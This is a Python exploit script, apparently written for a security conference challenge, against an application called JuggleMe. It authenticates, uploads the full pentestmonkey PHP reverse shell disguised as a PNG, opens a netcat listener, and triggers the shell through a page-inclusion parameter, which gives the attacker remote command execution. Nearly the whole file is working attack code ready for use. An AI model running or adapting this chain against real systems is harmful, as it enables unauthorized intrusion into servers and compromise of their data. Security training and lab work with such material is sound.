#!/usr/bin/python
import argparse
import pyfiglet
import requests
import time
import subprocess
proxies={
'http':'http://127.0.0.1:8081'
}
banner = pyfiglet.figlet_format("Optiv Source Zero Con")
print(banner)
print('Chained RCE exploit')
print('JuggleMe v 0.1.0')



class Exploit:

	def __init__(self, target_ip, target_port, localhost, localport, login, password):
		self.target_ip = target_ip
		self.target_port = target_port
		self.localhost = localhost
		self.localport = localport
		self.login = login
		self.password = password

	def exploitation(self):
		uploaded_file = "shell.php.png"
		files = {'image':(uploaded_file, "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no liability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = "+"'"+self.localhost+"'"+";  // CHANGE THIS\n$port = "+self.localport+";       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n\t// Fork and have the parent process exit\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\n\t// Make the current process a session leader\n\t// Will only succeed if we forked\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\t// Check for end of TCP connection\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\t// Check for end of STDOUT\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t// Wait until a command is end down $sock, or some\n\t// command output is available on STDOUT or STDERR\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\t// If we can read from the TCP socket, send\n\t// data to process's STDIN\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\t// If we can read from the process's STDOUT\n\t// send data down tcp connection\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\t// If we can read from the process's STDERR\n\t// send data down tcp connection\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>")
	}
		
		#Login to the app (getting auth token)
		url = "http://" + target_ip + ":" + target_port
		r = requests.Session()
		print("[*] Resolving URL...")
		r1 = r.get(url)
		time.sleep(3)
		print("[*] Logging in to application...")
		login_data={
				"user":login,
				"pass":password,
				"login":"LOGIN"
			}
		r2 = r.post(url + "/Login.php", data=login_data)
		if (r2.status_code == 200):
			print('[*] Login successful! Proceeding...')
		else:
			print('[*] Something went wrong!')
			quit()
		r3 = r.post(url +"/home.php", files=files)
		time.sleep(3)
		if (r3.status_code == 200):
			print('[*] Upload Successful! Proceeding...')
		else:
			print('[*] Something went Wrong!')
			quit()
		time.sleep(3)

		#netcat listener
		print("[*] Setting up a netcat listener")
		listener = subprocess.Popen(["nc", "-nvlp", self.localport])
		time.sleep(3)

		#exec the payload
		print("[*] Executing reverse shell payload")
		print("[*] Watchout for shell! :)")
		r5 = r.get(url + "/home.php?page=shell.php.png")
		listener.wait()

		if (r5.status_code == 200):
			print("[*] It worked!")
			listener.wait()
		else:
			print("[!] Something went wrong!")
			listener.terminate()

def get_args():
	parser = argparse.ArgumentParser(description='JuggleMe v 0.1.0 - Remote Code Execution (RCE) (Authenticated)')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
	parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
	parser.add_argument('-L', '--lh', dest="localhost", required=True, action='store', help='Listening IP')
	parser.add_argument('-P', '--lp', dest="localport", required=True, action='store', help='Listening port')
	parser.add_argument('-pa', '--pass', dest="password", required=True, action='store', help='password')
	parser.add_argument('-l', '--login', dest="login", required=True, action='store', help='User login')
	
	
	args = parser.parse_args()
	return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport
login = args.login
password = args.password

exp = Exploit(target_ip, target_port, localhost, localport, login, password)
exp.exploitation()
 
